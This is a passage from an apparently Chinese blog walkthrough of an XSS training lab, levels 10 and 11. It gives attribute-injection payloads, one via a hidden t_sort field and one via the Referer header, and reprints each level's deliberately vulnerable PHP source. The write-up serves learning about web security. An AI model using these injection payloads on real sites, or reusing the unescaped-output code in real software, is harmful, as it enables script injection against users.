class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;if&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;literal&quot;&gt;false&lt;&#x2F;span&gt;&#x3D;&#x3D;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strpos&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str7&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;http:&#x2F;&#x2F;&#x27;&lt;&#x2F;span&gt;))&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  &lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;        &#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;else&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  &lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str7&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 10&lt;&#x2F;p&gt;
&lt;p&gt;测试第一个标签处，发现全都被过滤&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;cac51a8eb6fd47de8782e2b57d225cf8.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;cac51a8eb6fd47de8782e2b57d225cf8.png&quot; alt&#x3D;&quot;img&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;只能从源代码中的三个hidden元素入手，进行传值测试后发现t_sort有回显(GET)，其余两个猜测为POST型&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202155934507.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202155934507.png&quot; alt&#x3D;&quot;image-20240202155934507&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;?t_sort&#x3D;&quot; onfocus&#x3D;javascript:alert() type&#x3D;&quot;text&#x2F;&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; ，因为此处输入框被隐藏，需要添加type&#x3D;“text”，或者在控制台内修改此处的hidden为button等。&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;t_sort&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&gt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form id&#x3D;search&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level10.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 11&lt;&#x2F;p&gt;
&lt;p&gt;查看网页源代码发现有四个hidden，分别尝试传值发现t_sort有回显，但几乎所有方法都被过滤，猜测t_ref为Referer头&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204135104746.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204135104746.png&quot; alt&#x3D;&quot;image-20240204135104746&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;BP抓包向Referer头填充数值1即可发现回显在t_ref内，可以在Referer头内构造Payload，相应包正确后在抓到的包内添加Referer头并放包即可。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204135754206.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204135754206.png&quot; alt&#x3D;&quot;image-20240204135754206&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;Referer: &quot; onclick&#x3D;&quot;alert(1)&quot; type&#x3D;&quot;true&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;30&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;31&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;32&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;33&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;34&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;35&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;36&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;meta http-equiv&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; content&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;window.alert &#x3D; &lt;span class&#x3D;&quot;function&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;function&quot;&gt;&lt;&#x2F;span&gt;&#123;     &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt; window.location.href&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level12.php?keyword&#x3D;good job!&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;title&gt;欢迎来到level11&lt;&#x2F;title&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;h1 align&#x3D;center&gt;欢迎来到level11&lt;&#x2F;h1&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;t_sort&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;variable&quot;&gt;$_SERVER&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;HTTP_REFERER&#x27;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&gt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form id&#x3D;search&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_ref&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level11.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span 